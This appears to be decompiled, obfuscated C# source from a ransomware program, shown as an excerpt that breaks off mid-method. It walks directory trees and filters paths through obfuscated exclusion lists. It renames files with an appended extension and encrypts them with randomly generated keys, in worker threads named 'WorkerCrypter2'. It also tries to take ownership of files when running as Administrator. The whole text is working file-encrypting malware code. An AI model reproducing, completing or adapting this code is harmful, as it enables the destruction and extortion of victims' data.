using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Linq;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using DxdMrHCZzlIaV;
using Microsoft.Win32;
using NBrvMqVjNNTT;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace jDlAujUelC;

internal sealed class hNCHegfceoe
{
	public sealed class tasvwISjgVBdlgK
	{
		private static StringCollection fWAqIMJyRlc;

		private static List<string> nWnIxpStkcRH;

		[NonSerialized]
		internal static GetString getString_0;

		public static List<string> SearchFiles(string string_0)
		{
			List<string> list = new List<string>();
			return WalkDirectoryTree(string_0);
		}

		private static List<string> WalkDirectoryTree(string string_0)
		{
			string[] array = null;
			string[] array2 = null;
			try
			{
				array = Directory.GetFiles(string_0, getString_0(107356628));
			}
			catch
			{
			}
			if (array != null)
			{
				string[] array3 = array;
				foreach (string text in array3)
				{
					try
					{
						if (!text.ToLower().Contains(getString_0(107356623)) && !text.ToLower().Contains(getString_0(107356570)) && !text.ToLower().Contains(getString_0(107407922)) && !text.ToLower().Contains(getString_0(107407877)) && !text.ToLower().Contains(getString_0(107356589)) && !text.ToLower().Contains(getString_0(107407761)) && !text.ToLower().Contains(getString_0(107407190)) && !text.ToLower().Contains(getString_0(107407141)) && !text.ToLower().Contains(getString_0(107407156)) && !text.ToLower().Contains(getString_0(107407107)) && !text.ToLower().Contains(getString_0(107407073)) && !text.ToLower().Contains(getString_0(107407088)) && !text.ToLower().Contains(getString_0(107407039)) && !text.ToLower().Contains(getString_0(107407058)) && !text.ToLower().Contains(getString_0(107407005)) && !text.ToLower().Contains(getString_0(107407024)) && !text.ToLower().Contains(getString_0(107406979)) && !text.ToLower().Contains(getString_0(107406994)) && !text.ToLower().Contains(getString_0(107407457)) && !text.Contains(UwCpksGCJZfb(getString_0(107407472))) && !text.Contains(getString_0(107407415)) && !text.Contains(getString_0(107407434)) && !text.EndsWith(getString_0(107411097)) && !text.EndsWith(getString_0(107407401)) && !text.EndsWith(getString_0(107407364)) && !text.EndsWith(getString_0(107407359)) && !text.EndsWith(getString_0(107407354)) && !text.ToLower().Contains(getString_0(107407381)) && !text.ToLower().Contains(kcoCbafUQcNu))
						{
							if (File.Exists(text) && (double)text.Length <= double.Parse(usPuVjNWIMFCfzm) * 1024.0 * 1024.0 && gXRstoeNfSB == getString_0(107396745))
							{
								nWnIxpStkcRH.Add(text);
							}
							else if (File.Exists(text) && gXRstoeNfSB == getString_0(107397002))
							{
								nWnIxpStkcRH.Add(text);
							}
						}
					}
					catch
					{
					}
				}
				array2 = Directory.GetDirectories(string_0);
				string[] array4 = array2;
				foreach (string string_ in array4)
				{
					WalkDirectoryTree(string_);
				}
			}
			return nWnIxpStkcRH;
		}

		static tasvwISjgVBdlgK()
		{
			Strings.CreateGetStringDelegate(typeof(tasvwISjgVBdlgK));
			fWAqIMJyRlc = new StringCollection();
			nWnIxpStkcRH = new List<string>();
		}
	}

	private sealed class mCHVUABGkRt
	{
		public string dlDWlLyApVaoI;

		public bool _003CMain_003Eb__6(Process process_0)
		{
			return process_0.ProcessName == dlDWlLyApVaoI;
		}
	}

	private sealed class diMjuCNLxzH
	{
		public string MOTThDWSWHsZUTLLA;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CMapDrv_003Eb__1a(int int_0)
		{
			Thread.Sleep(SlKkhSsDvLYM);
			OtDxRoGRan.Add(getString_0(107407314) + MOTThDWSWHsZUTLLA + getString_0(107397118) + (char)int_0 + getString_0(107356543));
			try
			{
				if (IebLDrmorstxvf)
				{
					Console.WriteLine(getString_0(107407314) + MOTThDWSWHsZUTLLA + getString_0(107397118) + (char)int_0 + getString_0(107356543));
				}
			}
			catch
			{
			}
		}

		static diMjuCNLxzH()
		{
			Strings.CreateGetStringDelegate(typeof(diMjuCNLxzH));
		}
	}

	private sealed class bBRpyIYYXJa
	{
		public string JJLjDBNMgJ;

		public bool _003CIsDriveNTFS_003Eb__1f(DriveInfo driveInfo_0)
		{
			return driveInfo_0.RootDirectory.Name == JJLjDBNMgJ;
		}
	}

	private sealed class GnNyOYNOWRBC
	{
		private sealed class bBCilqCEhC
		{
			public GnNyOYNOWRBC WBCzILjQvF;

			public string SBAWZSnSKvG;

			public void _003CCrypt_003Eb__29()
			{
				if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
				{
					MknoxGcvnLujD(WindowsIdentity.GetCurrent().Name, SBAWZSnSKvG);
				}
			}

			public void _003CCrypt_003Eb__2a()
			{
				RwVpPfwXURoGZx(SBAWZSnSKvG, WBCzILjQvF.OUZTXgxEDSb, WBCzILjQvF.ggMjtyxusvhkCT, WBCzILjQvF.KhkyNlfbSu, WBCzILjQvF.KhxNTnMDrBki);
			}
		}

		public string[] OUZTXgxEDSb;

		public string[] KhkyNlfbSu;

		public string KhxNTnMDrBki;

		public string ggMjtyxusvhkCT;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CCrypt_003Eb__28(string string_0)
		{
			bBCilqCEhC CS_0024_003C_003E8__locals0 = new bBCilqCEhC();
			CS_0024_003C_003E8__locals0.WBCzILjQvF = this;
			CS_0024_003C_003E8__locals0.SBAWZSnSKvG = string_0;
			if (JOJyxHQlEtnt && !GzujaRTNkzjcu().Contains(getString_0(107404877)) && !GzujaRTNkzjcu().Contains(getString_0(107356544)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						MknoxGcvnLujD(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.SBAWZSnSKvG);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (ABcQQsWptXmkku == getString_0(107396754))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					RwVpPfwXURoGZx(CS_0024_003C_003E8__locals0.SBAWZSnSKvG, CS_0024_003C_003E8__locals0.WBCzILjQvF.OUZTXgxEDSb, CS_0024_003C_003E8__locals0.WBCzILjQvF.ggMjtyxusvhkCT, CS_0024_003C_003E8__locals0.WBCzILjQvF.KhkyNlfbSu, CS_0024_003C_003E8__locals0.WBCzILjQvF.KhxNTnMDrBki);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				RwVpPfwXURoGZx(CS_0024_003C_003E8__locals0.SBAWZSnSKvG, OUZTXgxEDSb, ggMjtyxusvhkCT, KhkyNlfbSu, KhxNTnMDrBki);
			}
		}

		static GnNyOYNOWRBC()
		{
			Strings.CreateGetStringDelegate(typeof(GnNyOYNOWRBC));
		}
	}

	private sealed class xTicVszXpILTir
	{
		private sealed class sIsSRnqrXLf
		{
			public xTicVszXpILTir pvSBMBPwCxnGTc;

			public string NdQCkpOoElZY;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__36()
			{
				foreach (string item in dYfpziNqSOobL)
				{
					if (NdQCkpOoElZY.ToLower().EndsWith(item + pvSBMBPwCxnGTc.pcXEMNCHXKbhD) && SNKStIUyCToW == getString_0(107396765))
					{
						if (Convert.ToInt32(uQaSKuiUmt) * 1024 * 1024 > new FileInfo(NdQCkpOoElZY).Length)
						{
							try
							{
								SYJrybFSgaPzO.JEuvJEKelGD(getString_0(107408042), getString_0(107408037), getString_0(107408504), NdQCkpOoElZY);
							}
							catch
							{
							}
						}
					}
					else if (NdQCkpOoElZY.ToLower().EndsWith(item) && SNKStIUyCToW == getString_0(107397022))
					{
						try
						{
							SYJrybFSgaPzO.JEuvJEKelGD(getString_0(107408042), getString_0(107408037), getString_0(107408504), NdQCkpOoElZY);
						}
						catch
						{
						}
					}
				}
			}

			static sIsSRnqrXLf()
			{
				Strings.CreateGetStringDelegate(typeof(sIsSRnqrXLf));
			}
		}

		private sealed class sQMPyEprCtcgxr
		{
			public xTicVszXpILTir pvSBMBPwCxnGTc;

			public string hGIXrOjCnxEmIR;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__38()
			{
				foreach (string item in dYfpziNqSOobL)
				{
					if (hGIXrOjCnxEmIR.ToLower().EndsWith(item + pvSBMBPwCxnGTc.pcXEMNCHXKbhD) && SNKStIUyCToW == getString_0(107396768))
					{
						if (Convert.ToInt32(uQaSKuiUmt) * 1024 * 1024 > new FileInfo(hGIXrOjCnxEmIR).Length)
						{
							try
							{
								SYJrybFSgaPzO.JEuvJEKelGD(getString_0(107408045), getString_0(107408040), getString_0(107408507), hGIXrOjCnxEmIR);
							}
							catch
							{
							}
						}
					}
					else if (hGIXrOjCnxEmIR.ToLower().EndsWith(item) && SNKStIUyCToW == getString_0(107397025))
					{
						try
						{
							SYJrybFSgaPzO.JEuvJEKelGD(getString_0(107408045), getString_0(107408040), getString_0(107408507), hGIXrOjCnxEmIR);
						}
						catch
						{
						}
					}
				}
			}

			static sQMPyEprCtcgxr()
			{
				Strings.CreateGetStringDelegate(typeof(sQMPyEprCtcgxr));
			}
		}

		public List<string> YEkhRYiyyfwXXR;

		public List<string> dicUQzGeuGgAYU;

		public string pcXEMNCHXKbhD;

		public string[] AwSXDGKxLfSIbIc;

		public string ptBQsjxXVIiCd;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CWorkerCrypter2_003Eb__35(string string_0)
		{
			sIsSRnqrXLf CS_0024_003C_003E8__locals0;
			foreach (string item in dicUQzGeuGgAYU)
			{
				if (item.Contains(getString_0(107407982)) || item.Contains(getString_0(107407957)) || item.Contains(getString_0(107407924)) || item.ToLower().Contains(getString_0(107407939)) || item.ToLower().Contains(getString_0(107407894)) || item.Contains(getString_0(107407901)) || item.Contains(getString_0(107407848)) || item.ToLower().Contains(getString_0(107407867)) || item.ToLower().Contains(getString_0(107407822)) || item.ToLower().Contains(getString_0(107407785)) || item.ToLower().Contains(getString_0(107407808)) || item.ToLower().Contains(getString_0(107407759)) || item.ToLower().Contains(getString_0(107407221)) || item.ToLower().Contains(getString_0(107407232)) || item.Contains(getString_0(107407207)) || item.Contains(getString_0(107407158)) || item.Contains(getString_0(107407173)) || item.Contains(getString_0(107407124)) || item.Contains(getString_0(107407139)) || item.Contains(getString_0(107407090)) || item.Contains(getString_0(107407105)) || item.Contains(getString_0(107407056)) || item.Contains(getString_0(107407075)) || item.Contains(getString_0(107407022)) || item.ToLower().Contains(getString_0(107407041)) || item.ToLower().Contains(getString_0(107406996)) || item.ToLower().Contains(getString_0(107407011)) || item.ToLower().Contains(getString_0(107407474)) || item.Contains(UwCpksGCJZfb(getString_0(107407489))) || item.Contains(getString_0(107407432)) || item.Contains(getString_0(107397159)) || item.Contains(getString_0(107407451)) || item.EndsWith(pcXEMNCHXKbhD) || item.EndsWith(getString_0(107407418)) || item.EndsWith(getString_0(107407381)) || item.EndsWith(getString_0(107407376)) || item.EndsWith(getString_0(107407371)) || item.Contains(getString_0(107407398)) || item.Contains(kcoCbafUQcNu) || item.Contains(KymHhFbNcwDYA) || item.Contains(DNnNiXPlebeA))
				{
					continue;
				}
				if (AwSXDGKxLfSIbIc.Length != 0)
				{
					string[] awSXDGKxLfSIbIc = AwSXDGKxLfSIbIc;
					int num = 0;
					while (num < awSXDGKxLfSIbIc.Length)
					{
						string value = awSXDGKxLfSIbIc[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_0e93;
					}
				}
				try
				{
					if (item.EndsWith(pcXEMNCHXKbhD))
					{
						goto IL_0e93;
					}
				}
				catch (Exception)
				{
					goto IL_0e93;
				}
				if (!item.EndsWith(string_0) || usKuKFlfRGo.Contains(item))
				{
					continue;
				}
				if (ernpBfXEaTaC == getString_0(107396762))
				{
					try
					{
						if (sirjdslywbXhg.lbHjGrOeSMm(item))
						{
							sirjdslywbXhg.lbgprBqnBBcnLiR(item);
						}
					}
					catch
					{
					}
				}
				usKuKFlfRGo.Add(item);
				if (!aJxBDYqKswV.Contains(Path.GetDirectoryName(item)))
				{
					aJxBDYqKswV.Add(Path.GetDirectoryName(item));
				}
				JQZzLwKsZGVNU(item);
				try
				{
					new aCpGquenmSFv().advpQeGLuA(item);
				}
				catch
				{
				}
				try
				{
					using FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Write);
					if (!fileStream.CanWrite)
					{
						try
						{
							if (IebLDrmorstxvf)
							{
								Console.WriteLine(getString_0(107356571) + item + getString_0(107355982) + new FileInfo(item).Length + getString_0(107355993));
								Console.WriteLine(getString_0(107355952));
							}
						}
						catch
						{
						}
						eZjDlpokwsIwI(UwCpksGCJZfb(getString_0(107355879)), getString_0(107407282) + item + getString_0(107407282) + UwCpksGCJZfb(getString_0(107355822)) + getString_0(107407282) + Environment.UserName + getString_0(107407282) + UwCpksGCJZfb(getString_0(107355837)));
					}
				}
				catch (Exception ex2)
				{
					if (LbhjvcCDDsZLYlccs)
					{
						try
						{
							File.AppendAllText(KymHhFbNcwDYA, getString_0(107404539) + item + getString_0(107355812) + ex2.Message + getString_0(107396529));
						}
						catch (Exception)
						{
						}
					}
					continue;
				}
				try
				{
					try
					{
						if (new FileInfo(item).Length == 0L)
						{
							continue;
						}
					}
					catch (Exception ex4)
					{
						if (LbhjvcCDDsZLYlccs)
						{
							try
							{
								File.AppendAllText(KymHhFbNcwDYA, getString_0(107404539) + item + getString_0(107356211) + ex4.Message + getString_0(107396529));
							}
							catch (Exception)
							{
							}
						}
						WfLfyuLvRnJc++;
						goto end_IL_0716;
					}
					if (zLetmNvKrIwT == getString_0(107396762) && new FileInfo(item).Length > Convert.ToInt32(vwHJGZSsQHuV) * 1024 * 1024 && !YEkhRYiyyfwXXR.Contains(string_0))
					{
						CS_0024_003C_003E8__locals0 = new sIsSRnqrXLf();
						CS_0024_003C_003E8__locals0.pvSBMBPwCxnGTc = this;
						try
						{
							if (pcXEMNCHXKbhD != getString_0(107404777))
							{
								if (rCIcEDqTdpw)
								{
									pcXEMNCHXKbhD = gpxoAkpemIpRD + pcXEMNCHXKbhD;
								}
								File.Move(item, item + pcXEMNCHXKbhD);
							}
						}
						catch (Exception ex6)
						{
							if (LbhjvcCDDsZLYlccs)
							{
								try
								{
									File.AppendAllText(KymHhFbNcwDYA, getString_0(107404539) + item + getString_0(107356150) + ex6.Message + getString_0(107396529));
								}
								catch (Exception)
								{
								}
							}
							WfLfyuLvRnJc++;
							goto end_IL_0716;
						}
						CS_0024_003C_003E8__locals0.NdQCkpOoElZY = getString_0(107408438);
						if (pcXEMNCHXKbhD != getString_0(107404777))
						{
							CS_0024_003C_003E8__locals0.NdQCkpOoElZY = item + pcXEMNCHXKbhD;
						}
						else
						{
							CS_0024_003C_003E8__locals0.NdQCkpOoElZY = item;
						}
						if (wASqMXkPHKG == getString_0(107396762))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item2 in dYfpziNqSOobL)
								{
									if (CS_0024_003C_003E8__locals0.NdQCkpOoElZY.ToLower().EndsWith(item2 + CS_0024_003C_003E8__locals0.pvSBMBPwCxnGTc.pcXEMNCHXKbhD) && SNKStIUyCToW == sIsSRnqrXLf.getString_0(107396765))
									{
										if (Convert.ToInt32(uQaSKuiUmt) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.NdQCkpOoElZY).Length)
										{
											try
											{
												SYJrybFSgaPzO.JEuvJEKelGD(sIsSRnqrXLf.getString_0(107408042), sIsSRnqrXLf.getString_0(107408037), sIsSRnqrXLf.getString_0(107408504), CS_0024_003C_003E8__locals0.NdQCkpOoElZY);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.NdQCkpOoElZY.ToLower().EndsWith(item2) && SNKStIUyCToW == sIsSRnqrXLf.getString_0(107397022))
									{
										try
										{
											SYJrybFSgaPzO.JEuvJEKelGD(sIsSRnqrXLf.getString_0(107408042), sIsSRnqrXLf.getString_0(107408037), sIsSRnqrXLf.getString_0(107408504), CS_0024_003C_003E8__locals0.NdQCkpOoElZY);
										}
										catch
										{
										}
									}
								}
							});
							thread.Priority = ThreadPriority.Normal;
							thread.IsBackground = false;
							thread.Start();
						}
						string text = PedoVUYBDhwUQjvS.NlfnWjhcyWLLT(32);
						string text2 = getString_0(107408438);
						text2 = (aeWIyHaDtadg ? PedoVUYBDhwUQjvS.wRFGskFNOCi() : getString_0(107408438));
						string s = ooALNlRpqMWnp.oXJvdDupCCWESvWS(text + text2);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						if (tmrMvaVtFfCS == getString_0(107397019))
						{
							byte[] array = null;
							byte[] byte_ = NaRnXemgrEhEu.CfIULFaxXTze(CS_0024_003C_003E8__locals0.NdQCkpOoElZY, Convert.ToInt32(vwHJGZSsQHuV) * 1024 * 1024);
							if (NaRnXemgrEhEu.dyvfLRQwyjnq(NlACJGRWEHCA: (!vGfsNnNMtKaym) ? (aeWIyHaDtadg ? NaRnXemgrEhEu.vWTJMcrwiwmBiRL(byte_, Convert.FromBase64String(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : NaRnXemgrEhEu.vWTJMcrwiwmBiRL(byte_, Convert.FromBase64String(ptBQsjxXVIiCd), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (aeWIyHaDtadg ? GpnnmMPrTtDBD.kAaFSjIASsxCjS(byte_, Convert.FromBase64String(text), Convert.FromBase64String(text2)) : GpnnmMPrTtDBD.kAaFSjIASsxCjS(byte_, Convert.FromBase64String(ptBQsjxXVIiCd), Convert.FromBase64String(heWrupMPBNsV))), CeNYFaLSDRX: CS_0024_003C_003E8__locals0.NdQCkpOoElZY, YSvPvJtuif: bytes))
							{
								goto IL_0e93;
							}
							try
							{
								File.Move(item + pcXEMNCHXKbhD, item);
							}
							catch (Exception)
							{
							}
						}
						else if (!aeWIyHaDtadg)
						{
							if (GwvItkvAvmqBoMs.bEpaIEDRMOENWhX(CS_0024_003C_003E8__locals0.NdQCkpOoElZY, vwHJGZSsQHuV, ptBQsjxXVIiCd, null, Convert.FromBase64String(heWrupMPBNsV)))
							{
								goto IL_0e93;
							}
							try
							{
								File.Move(item + pcXEMNCHXKbhD, item);
							}
							catch (Exception)
							{
							}
						}
						else
						{
							if (GwvItkvAvmqBoMs.bEpaIEDRMOENWhX(CS_0024_003C_003E8__locals0.NdQCkpOoElZY, vwHJGZSsQHuV, text, bytes, Convert.FromBase64String(text2)))
							{
								goto IL_0e93;
							}
							try
							{
								File.Move(item + pcXEMNCHXKbhD, item);
							}
							catch (Exception)
							{
							}
						}
						continue;
					}
					if (rCIcEDqTdpw)
					{
						pcXEMNCHXKbhD = gpxoAkpemIpRD + pcXEMNCHXKbhD;
					}
					string text3 = PedoVUYBDhwUQjvS.NlfnWjhcyWLLT(32);
					string text4 = getString_0(107408438);
					text4 = (aeWIyHaDtadg ? PedoVUYBDhwUQjvS.wRFGskFNOCi() : getString_0(107408438));
					string s2 = ooALNlRpqMWnp.oXJvdDupCCWESvWS(text3 + text4);
					byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
					if (pcXEMNCHXKbhD != getString_0(107404777))
					{
						if (!YEiCwolccbrDJ)
						{
							if (!aeWIyHaDtadg)
							{
								FUeBmieOxgVOz(item, item + pcXEMNCHXKbhD, VROLwKjAIsul);
							}
							else
							{
								FUeBmieOxgVOz(item, item + pcXEMNCHXKbhD, Convert.FromBase64String(text3));
							}
						}
						else
						{
							try
							{
								if (!aeWIyHaDtadg)
								{
									UhqvkICiuPON(item, item + pcXEMNCHXKbhD, VROLwKjAIsul, Convert.FromBase64String(heWrupMPBNsV));
								}
								else
								{
									UhqvkICiuPON(item, item + pcXEMNCHXKbhD, Convert.FromBase64String(text3), Convert.FromBase64String(text4));
								}
							}
							catch (Exception ex11)
							{
								if (LbhjvcCDDsZLYlccs)
								{
									try
									{
										File.AppendAllText(KymHhFbNcwDYA, getString_0(107404539) + item + getString_0(107404795) + ex11.Message + getString_0(107396529));
									}
									catch (Exception)
									{
									}
								}
								WfLfyuLvRnJc++;
								try
								{
									File.Move(item + pcXEMNCHXKbhD, item);
								}
								catch (Exception)
								{
								}
								goto end_IL_0716;
							}
						}
					}
					else if (!YEiCwolccbrDJ)
					{
						if (!aeWIyHaDtadg)
						{
							FUeBmieOxgVOz(item, item + getString_0(107404804), VROLwKjAIsul);
						}
						else
						{
							FUeBmieOxgVOz(item, item + getString_0(107404804), Convert.FromBase64String(text3));
						}
					}
					else
					{
						try
						{
							if (!aeWIyHaDtadg)
							{
								UhqvkICiuPON(item, item, VROLwKjAIsul, Convert.FromBase64String(heWrupMPBNsV));
							}
							else
							{
								UhqvkICiuPON(item, item, Convert.FromBase64String(text3), Convert.FromBase64String(text4));
							}
						}
						catch (Exception ex14)
						{
							if (LbhjvcCDDsZLYlccs)
							{
								try
								{
									File.AppendAllText(KymHhFbNcwDYA, getString_0(107404539) + item + getString_0(107404795) + ex14.Message + getString_0(107396529));
								}
								catch (Exception)
								{
								}
							}
							WfLfyuLvRnJc++;
							goto end_IL_0716;
						}
					}
					if (aeWIyHaDtadg)
					{
						if (pcXEMNCHXKbhD != getString_0(107404777))
						{
							fowJyXOiDyhEY(item + pcXEMNCHXKbhD, bytes2);
						}
						else
						{
							fowJyXOiDyhEY(item, bytes2);
						}
					}
					goto IL_0e93;
					end_IL_0716:;
				}
				catch (Exception)
				{
					goto IL_0e93;
				}
				continue;
				IL_0e93:
				dicUQzGeuGgAYU.Remove(item);
			}
		}

		public void _003CWorkerCrypter2_003Eb__37(string string_0)
		{
			sQMPyEprCtcgxr CS_0024_003C_003E8__locals0 = new sQMPyEprCtcgxr();
			CS_0024_003C_003E8__locals0.pvSBMBPwCxnGTc = this;
			CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR = string_0;
			if (!CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR.Contains(getString_0(107407982)) && !CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR.Contains(getString_0(107407957)) && !CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR.Contains(getString_0(107407924)) && !CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR.ToLower().Contains(getString_0(107407939)) && !CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR.ToLower().Contains(getString_0(107407894)) && !CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR.Contains(getString_0(107407901)) && !CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR.Contains(getString_0(107407848)) && !CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR.ToLower().Contains(getString_0(107407867)) && !CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR.ToLower().Contains(getString_0(107407822)) && !CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR.ToLower().Contains(getString_0(107407785)) && !CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR.ToLower().Contains(getString_0(107407808)) && !CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR.ToLower().Contains(getString_0(107407759)) && !CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR.ToLower().Contains(getString_0(107407221)) && !CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR.ToLower().Contains(getString_0(107407232)) && !CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR.Contains(getString_0(107407207)) && !CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR.Contains(getString_0(107407158)) && !CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR.Contains(getString_0(107407173)) && !CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR.Contains(getString_0(107407124)) && !CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR.Contains(getString_0(107407139)) && !CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR.Contains(getString_0(107407090)) && !CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR.Contains(getString_0(107407105)) && !CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR.Contains(getString_0(107407056)) && !CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR.Contains(getString_0(107407075)) && !CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR.Contains(getString_0(107407022)) && !CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR.ToLower().Contains(getString_0(107407041)) && !CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR.ToLower().Contains(getString_0(107406996)) && !CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR.ToLower().Contains(getString_0(107407011)) && !CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR.ToLower().Contains(getString_0(107407474)) && !CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR.Contains(UwCpksGCJZfb(getString_0(107407489))) && !CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR.Contains(getString_0(107407432)) && !CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR.Contains(getString_0(107397159)) && !CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR.Contains(getString_0(107407451)) && !CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR.EndsWith(pcXEMNCHXKbhD) && !CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR.EndsWith(getString_0(107407418)) && !CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR.EndsWith(getString_0(107407381)) && !CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR.EndsWith(getString_0(107407376)) && !CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR.EndsWith(getString_0(107407371)) && !CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR.Contains(getString_0(107407398)) && !CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR.Contains(kcoCbafUQcNu) && !CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR.Contains(KymHhFbNcwDYA) && !CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR.Contains(DNnNiXPlebeA))
			{
				if (AwSXDGKxLfSIbIc.Length != 0)
				{
					string[] awSXDGKxLfSIbIc = AwSXDGKxLfSIbIc;
					int num = 0;
					while (num < awSXDGKxLfSIbIc.Length)
					{
						string value = awSXDGKxLfSIbIc[num];
						if (!CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_1069;
					}
				}
				try
				{
					if (CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR.EndsWith(pcXEMNCHXKbhD))
					{
						goto IL_1069;
					}
				}
				catch (Exception)
				{
					goto IL_1069;
				}
				if (!usKuKFlfRGo.Contains(CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR))
				{
					if (ernpBfXEaTaC == getString_0(107396762))
					{
						try
						{
							if (sirjdslywbXhg.lbHjGrOeSMm(CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR))
							{
								sirjdslywbXhg.lbgprBqnBBcnLiR(CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR);
							}
						}
						catch
						{
						}
					}
					usKuKFlfRGo.Add(CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR);
					if (!aJxBDYqKswV.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR)))
					{
						aJxBDYqKswV.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR));
					}
					JQZzLwKsZGVNU(CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR);
					try
					{
						new aCpGquenmSFv().advpQeGLuA(CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR);
					}
					catch
					{
					}
					try
					{
						using FileStream fileStream = new FileStream(CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR, FileMode.Open, FileAccess.Write);
						if (!fileStream.CanWrite)
						{
							try
							{
								if (IebLDrmorstxvf)
								{
									Console.WriteLine(getString_0(107356571) + CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR + getString_0(107355982) + new FileInfo(CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR).Length + getString_0(107355993));
									Console.WriteLine(getString_0(107355952));
								}
							}
							catch
							{
							}
							eZjDlpokwsIwI(UwCpksGCJZfb(getString_0(107355879)), getString_0(107407282) + CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR + getString_0(107407282) + UwCpksGCJZfb(getString_0(107355822)) + getString_0(107407282) + Environment.UserName + getString_0(107407282) + UwCpksGCJZfb(getString_0(107355837)));
						}
					}
					catch (Exception ex2)
					{
						if (LbhjvcCDDsZLYlccs)
						{
							try
							{
								File.AppendAllText(KymHhFbNcwDYA, getString_0(107404539) + CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR + getString_0(107355812) + ex2.Message + getString_0(107396529));
								return;
							}
							catch (Exception)
							{
								return;
							}
						}
						return;
					}
					try
					{
						try
						{
							if (new FileInfo(CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR).Length != 0L)
							{
								goto end_IL_085c;
							}
							goto end_IL_085c_2;
							end_IL_085c:;
						}
						catch (Exception ex4)
						{
							if (LbhjvcCDDsZLYlccs)
							{
								try
								{
									File.AppendAllText(KymHhFbNcwDYA, getString_0(107404539) + CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR + getString_0(107356211) + ex4.Message + getString_0(107396529));
								}
								catch (Exception)
								{
								}
							}
							WfLfyuLvRnJc++;
							goto end_IL_085c_2;
						}
